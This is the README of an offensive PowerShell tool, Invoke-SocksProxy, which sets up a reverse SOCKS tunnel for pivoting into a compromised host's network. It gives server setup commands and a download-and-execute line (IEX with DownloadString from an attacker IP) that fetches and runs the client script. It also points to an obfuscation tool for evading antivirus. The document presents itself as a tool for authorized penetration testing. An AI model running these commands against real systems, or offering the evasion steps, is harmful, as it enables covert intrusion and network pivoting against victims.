# Invoke-SocksProxy
Creates a local or "reverse" Socks proxy using powershell.

The local proxy is a simple Socks 4/5 proxy.

The reverse proxy creates a tcp tunnel by initiating outbond SSL connections that can go through the system's proxy. The tunnel can then be used as a socks proxy on the remote host to pivot into the local host's network.

Modified from [Invoke-SocksProxy](https://github.com/p3nt4/Invoke-SocksProxy) due to deprecation issues with SSL, etc.

# Usage

## Server
Create server SSL certificates
```sh
openssl req -x509 -newkey rsa:2048 -nodes -keyout /tmp/private.key -out /tmp/cert.pem -subj "/CN=whatever.com" -days 9999 &>/dev/null
fingerprint=$(openssl x509 -in /tmp/cert.pem -noout -sha1 -fingerprint | cut -d "=" -f 2 | tr -d ":")
echo "Use $fingerprint for <cert_fingerprint>"
```

Run the socks proxy server via python3 on port 1080:
```sh
python3 SocksProxyServer.py <attacker_port> 1080 /tmp/cert.pem /tmp/private.key
```

## Client
Add this to the end of `Invoke-SocksProxy.ps1`
```sh
Invoke-ReverseSocksProxy -remotePort <attacker_port> -remoteHost <attacker_ip> -maxRetries 3 -certFingerprint <cert_fingerprint>
```
```sh
powershell IEX(New-Object Net.WebClient).DownloadString('http://<attacker_ip>/Invoke-SocksProxy.ps1')
```
For AV evasion, you can obfuscate easily with [Invoke-Stealth](https://github.com/JoelGMSec/Invoke-Stealth)

# Disclaimer
This project is intended for security researchers and penetration testers and should only be used with the approval of system owners.